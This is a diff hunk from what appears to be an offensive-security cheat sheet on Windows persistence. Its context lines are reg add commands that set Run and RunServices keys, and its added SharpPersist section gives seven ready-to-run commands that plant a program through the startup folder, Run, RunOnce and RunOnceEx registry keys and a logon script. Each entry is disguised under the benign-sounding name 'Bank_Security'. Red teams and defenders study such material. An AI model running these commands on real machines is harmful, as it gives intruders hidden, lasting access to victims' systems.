@@ -40,3 +40,17 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v 1 /t REG_SZ /d "C:\Windows\Temp\example.bat"
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v 1 /t REG_SZ /d "C:\Windows\Temp\example.bat"
 ```
+
+### SharpPersist
+
+* [https://github.com/fireeye/SharPersist  ](https://github.com/fireeye/SharPersist)
+
+```
+SharPersist.exe -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\example.exe" -f "Bank_Security" -m add
+SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\example.exe" -k "hkcurun" -v "Bank_Security" -m add
+SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\example.bat" -k "hklmrun" -v "Bank_Security" -m add -o env
+SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\example.bat" -k "hklmrunonce" -v "Bank_Security" -m add
+SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\example.bat" -k "hklmrunonceex" -v "Bank_Security" -m add
+SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\example.bat" -k "hkcurunonce" -v "Bank_Security" -m add
+SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\example.bat" -k "logonscript" -m add
+```
